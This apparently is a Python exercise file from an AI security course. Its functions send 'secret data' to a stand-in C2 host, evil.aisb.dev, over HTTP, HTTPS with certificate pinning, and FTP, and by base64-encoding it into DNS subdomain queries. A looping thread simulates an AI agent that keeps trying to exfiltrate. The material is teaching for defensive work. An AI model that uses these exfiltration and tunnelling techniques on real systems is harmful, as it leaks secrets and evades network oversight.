# %%
import os

import base64
import time

from typing import Optional, Dict, Any
from unittest.mock import patch, MagicMock

import requests


# %%
if __name__ == "__main__":  # Only executed when running the script directly
    # Make requests to the evil server with different secret data.
    # This simulates an AI agent repeatedly trying to exfiltrate data.

    def loop_exfiltration():
        while True:
            global exfiltrate_data
            try:
                time.sleep(5)
                print(exfiltrate_data("some_secret_data"))
            except KeyboardInterrupt:
                print("Stopping exfiltration loop.")
                break

    import threading

    thread = threading.Thread(target=loop_exfiltration)
    thread.start()
# %%

"""
Send a GET request to evil.aisb.dev with secret data.

This simulates an AI agent attempting to communicate with an external C2 server.
The secret data is sent as a query parameter.

Args:
    secret_data: The secret information to exfiltrate

Returns:
    The response text from the server, or None if the request fails or throws
"""


def make_evil_request(secret_data: str) -> Optional[str]:
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
    #   2. Return the response text if successful (status 200), None otherwise
    kwargs = {"data": secret_data}
    try:
        response = requests.get("http://evil.aisb.dev/exfiltrate", timeout=5, params=kwargs)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except requests.exceptions.RequestException:
        return None


# exfiltrate_data = make_evil_request

# %%

"""
Send a GET request over HTTPS to evil.aisb.dev with secret data.

Args:
    secret_data: The secret information to exfiltrate

Returns:
    The response text from the server, or None if the request fails
"""


def make_evil_request_https(secret_data: str) -> Optional[str]:
    kwargs = {"data": secret_data}

    try:
        # Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
        response = requests.get("https://evil.aisb.dev/exfiltrate", timeout=5, params=kwargs)

        # Return the response text if successful (status 200), None otherwise
        if response.status_code == 200:
            return response.text
        else:
            print(f"Request failed with status code: {response.status_code}")
            return None

    except requests.exceptions.SSLError as e:
        print(f"SSL Error (certificate issue?): {e}")
        return None
    except requests.exceptions.RequestException:
        return None


# Update the exfiltrate_data function to use HTTPS
# exfiltrate_data = make_evil_request_https

# %%

"""
Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.

This function uses certificate pinning to ensure we're talking to the real
evil.aisb.dev server, not a MITM proxy with a self-signed certificate.

Args:
    secret_data: The secret information to exfiltrate

Returns:
    The response text from the server, or None if the request fails
"""


def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    kwargs = {"data": secret_data}

    try:
        # Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
        # Use verify='isrg-root-x1.pem' as a parameter to requests to pin the certificate
        response = requests.get("https://evil.aisb.dev/exfiltrate", timeout=5, params=kwargs, verify="isrg-root-x1.pem")

        # Return the response text if successful (status 200), None otherwise
        if response.status_code == 200:
            return response.text
        else:
            print(f"Request failed with status code: {response.status_code}")
            return None

    except requests.exceptions.SSLError as e:
        print(f"SSL Error (certificate issue?): {e}")
        return None

    except requests.exceptions.RequestException:
        return None

    except FileNotFoundError:
        print("Certificate file 'isrg-root-x1.pem' not found")
        return None


exfiltrate_data = make_evil_request_pinned

# %%


"""
Send a request over FTP to ftp.scene.org with secret data.

This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.

Args:
    secret_data: The secret information to exfiltrate

Returns:
    The response text from the server, or None if the request fails
"""


def make_evil_request_ftp(secret_data: str) -> Optional[str]:
    # TODO: Implement the function to:
    #   1. Connect to ftp.scene.org using the ftplib library
    #   2. Read some data (e.g., list files in the root directory)
    #   3. Return the response text if successful, None otherwise

    try:
        from ftplib import FTP

        ftp = FTP("ftp.scene.org", timeout=5)
        ftp.login()  # Anonymous login

        # Read some data (e.g., list files in the root directory)
        files = ftp.nlst()  # Get a list of files in the current directory

        # Close the connection
        ftp.quit()

        return str(files)  # Return the list of files as a string
    except Exception as e:
        print(f"FTP request failed: {e}")
        return None


exfiltrate_data = make_evil_request_ftp

# %%


import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns

resolver = dns_resolver.Resolver()
resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]

"""
Send a DNS request to evil.aisb.dev to exfiltrate secret data.

This simulates an AI agent attempting to communicate using DNS queries.

Args:
    secret_data: The secret information to exfiltrate

Returns:
    The response text from the DNS query, or None if the request fails
"""

import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns

resolver = dns_resolver.Resolver()

# make sure that your DNS server is first
# the order is important
# the resolver library gave up after receiving a response from google
resolver.nameservers = [
    "127.0.0.1",  # loopback address pointing to your own machine - a local DNS server
    "8.8.8.8",  # Google's primary public DNS server
    "1.1.1.1",  # Cloudflare's public DNS server
]


def make_evil_request_dns(secret_data: str) -> Optional[str]:
    try:
        # Construct a domain like secret_data.evil.aisb.dev (remember to encode secret_data with base64.urlsafe_b64encode)
        encoded_data = base64.urlsafe_b64encode(secret_data.encode())
        url = f"{encoded_data.decode()}.evil.aisb.dev"

        # Perform a DNS query for TXT records using resolver.resolve
        result = resolver.resolve(url, "TXT")

        # Return the first TXT record found, or None if no records are found
        return str(result[0].to_text()) if result else None

    except dns_resolver.NoAnswer:
        print("No answer received for DNS query")
        return None

    except dns_resolver.NXDOMAIN:
        print("Domain does not exist")
        return None

    except Exception as e:
        print(f"DNS failed: {e}")
        return None


from w1d2_test import test_make_evil_request_dns

test_make_evil_request_dns(make_evil_request_dns, resolver)

# Set the exfiltration function for use in the exercise
exfiltrate_data = make_evil_request_dns
